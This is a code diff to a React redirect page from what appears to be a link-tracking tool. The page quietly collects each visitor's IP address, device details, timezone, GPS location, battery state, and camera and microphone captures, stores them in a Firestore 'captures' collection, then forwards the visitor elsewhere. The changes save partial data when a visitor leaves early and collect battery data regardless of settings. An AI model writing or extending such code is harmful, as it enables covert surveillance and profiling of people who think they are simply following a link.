@@ -247,6 +247,47 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
   const t = React.useMemo(() => getTranslator(settings?.redirectLanguage || 'en'), [settings?.redirectLanguage]);
   
   const permissionStatusRef = React.useRef<Record<PermissionType, PermissionState | 'n/a'>>({ location: 'n/a', camera: 'n/a', microphone: 'n/a', battery: 'n/a' });
+  const capturedDataRef = React.useRef<Partial<CapturedData>>({});
+  const hasSavedRef = React.useRef(false);
+
+  const saveData = React.useCallback(async (dataToSave: Partial<CapturedData>, settingsToUse: Settings, isComplete: boolean) => {
+    if (hasSavedRef.current) return;
+
+    // Check if there is meaningful data to save
+    if (!dataToSave.ip && !dataToSave.cameraCapture && !dataToSave.microphoneCapture && !dataToSave.location?.lat) {
+        return;
+    }
+    
+    hasSavedRef.current = true;
+    
+    const finalData: Partial<CapturedData> = {
+        ...dataToSave,
+        redirectId: settingsToUse.id,
+        status: isComplete ? 'completed' : 'incomplete',
+        timestamp: Date.now(),
+        name: `Capture on ${new Date().toLocaleDateString()}`,
+    };
+    
+    Object.keys(finalData).forEach(key => (finalData as any)[key] === undefined && delete (finalData as any)[key]);
+    
+    try {
+        await addDoc(collection(db, 'captures'), finalData);
+    } catch (e) {
+        console.error("Failed to save captured data:", e);
+    }
+  }, []);
+
+  React.useEffect(() => {
+    const handleBeforeUnload = () => {
+        if (settings && !hasSavedRef.current) {
+            saveData(capturedDataRef.current, settings, false);
+        }
+    };
+    window.addEventListener('beforeunload', handleBeforeUnload);
+    return () => {
+        window.removeEventListener('beforeunload', handleBeforeUnload);
+    };
+  }, [settings, saveData]);
 
   React.useEffect(() => {
     const loadSettings = async () => {
@@ -317,6 +358,14 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
             const userAgent = navigator.userAgent;
             const osMatch = userAgent.match(/(Windows|Mac OS|Linux|Android|iOS)/);
             
+            capturedDataRef.current.ip = ipData.ip || 'Unknown';
+            capturedDataRef.current.userAgent = userAgent;
+            capturedDataRef.current.os = osMatch ? osMatch[0] : 'Unknown';
+            capturedDataRef.current.browser = userAgent.match(/(Chrome|Firefox|Safari|Edge|OPR)/)?.[0] || 'Unknown';
+            capturedDataRef.current.deviceType = 'ontouchstart' in window ? 'Mobile' : 'Desktop';
+            capturedDataRef.current.language = navigator.language;
+            capturedDataRef.current.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
             // --- Location ---
             let locationData = { lat: ipData.latitude ? Number(ipData.latitude) : null, lon: ipData.longitude ? Number(ipData.longitude) : null, accuracy: ipData.accuracy ? Number(ipData.accuracy) : null, city: ipData.city || 'Unknown', country: ipData.country || 'Unknown', source: 'ip' as 'ip' | 'gps' };
             if (permissionStatusRef.current.location === 'granted') {
@@ -327,14 +376,14 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
                     }, () => resolve(), { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
                 });
             }
+            capturedDataRef.current.location = locationData;
 
             // --- Battery ---
-            let batteryData = null;
-            if (settings.captureInfo.permissions.includes('battery') && 'getBattery' in navigator) {
+            if ('getBattery' in navigator) { // Battery is captured by default now
                 try {
                     const batteryManager = await (navigator as any).getBattery();
                     permissionStatusRef.current.battery = 'granted';
-                    batteryData = {
+                    capturedDataRef.current.battery = {
                         level: Math.round(batteryManager.level * 100),
                         charging: batteryManager.charging
                     };
@@ -376,33 +425,17 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
             } catch (uploadError) {
                 console.error("Media upload failed, proceeding without media:", uploadError);
             }
-            
-            const captured: Omit<CapturedData, 'id'> = {
-                redirectId: settings.id,
-                name: `Capture on ${new Date().toLocaleDateString()}`,
-                timestamp: Date.now(),
-                ip: ipData.ip || 'Unknown',
-                userAgent,
-                os: osMatch ? osMatch[0] : 'Unknown',
-                browser: userAgent.match(/(Chrome|Firefox|Safari|Edge|OPR)/)?.[0] || 'Unknown',
-                deviceType: 'ontouchstart' in window ? 'Mobile' : 'Desktop',
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                location: locationData,
-                permissions: {
-                    location: permissionStatusRef.current.location,
-                    camera: permissionStatusRef.current.camera,
-                    microphone: permissionStatusRef.current.microphone,
-                },
-                battery: batteryData,
-                cameraCapture: cameraUrl,
-                microphoneCapture: micUrl,
+
+            capturedDataRef.current.permissions = {
+                location: permissionStatusRef.current.location,
+                camera: permissionStatusRef.current.camera,
+                microphone: permissionStatusRef.current.microphone,
             };
-    
-            // Remove undefined fields before saving to Firestore
-            Object.keys(captured).forEach(key => (captured as any)[key] === undefined && delete (captured as any)[key]);
+            capturedDataRef.current.cameraCapture = cameraUrl;
+            capturedDataRef.current.microphoneCapture = micUrl;
             
-            await addDoc(collection(db, 'captures'), captured);
+            await saveData(capturedDataRef.current, settings, true);
+
         } catch (error) {
             console.error("Failed to save captured data:", error);
         } finally {
@@ -412,7 +445,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
               window.location.href = settings.redirectUrl;
             }
         }
-    }, [settings, isPreview, addNotification]);
+    }, [settings, isPreview, addNotification, saveData]);
 
     const requestPermissions = React.useCallback(async () => {
         if (!settings || isPreview) return;
